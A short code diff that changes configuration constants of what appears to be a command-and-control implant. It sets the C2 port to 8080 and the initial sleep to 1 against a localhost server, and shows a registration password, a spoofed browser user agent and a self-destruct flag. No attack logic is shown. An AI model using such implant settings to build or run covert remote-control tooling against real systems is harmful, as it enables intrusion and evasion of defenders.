@@ -9,13 +9,13 @@ const DEBUG = true
 
 // !!!!!!!!!! CHANGE THESE !!!!!!!!! //
 const C2_DOMAIN = "localhost"
-const C2_PORT = 80
+const C2_PORT = 8080
 const C2_USE_TLS = false
 const C2_REGISTER_PASSWORD = "SWh5bHhGOENYQWF1TW9KR3VTb0YwVkVWbDRud1RFaHc="
 
 // !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! //
 
-const INITIAL_SLEEP = 180
+const INITIAL_SLEEP = 1
 const REGISTER_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)"
 const REGISTER_ATTEMPTS = 3
 const AUTO_SELF_DESTRUCT = false
